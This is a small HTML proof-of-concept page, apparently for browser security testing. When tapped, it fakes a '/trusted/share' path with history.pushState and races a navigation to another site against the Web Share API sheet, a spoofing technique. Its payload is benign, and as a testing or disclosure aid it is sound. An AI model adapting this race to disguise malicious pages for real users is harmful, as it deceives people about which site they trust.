<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Web Share PoC</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">

    <style>
        html, body {
            margin: 0;
            width: 100vw;
            height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            user-select: none;
        }

        body {
            display: flex;
            align-items: center;
            justify-content: center;
            background: #f5f5f7;
        }
    </style>
</head>

<body>
    <h1>Tap anywhere to share</h1>

<script>
const shareData = {
    title: "Web Share Test",
    text: "Testing Web Share API behavior during navigation.",
    url: "https://example.com"
};

document.body.addEventListener('click', async () => {

    // Step 1: Fake trusted path (optional but realistic)
    history.pushState({}, '', '/trusted/share');

    // Step 2: Start navigation race while share sheet is opening
    let race = setInterval(() => {
        location.href = "https://www.google.com";
    }, 5000);

    try {
        await navigator.share(shareData);
    } catch (e) {
        // user cancelled share
    }

    // Step 3: Stop race after interaction
    clearInterval(race);
});
</script>

</body>
</html>
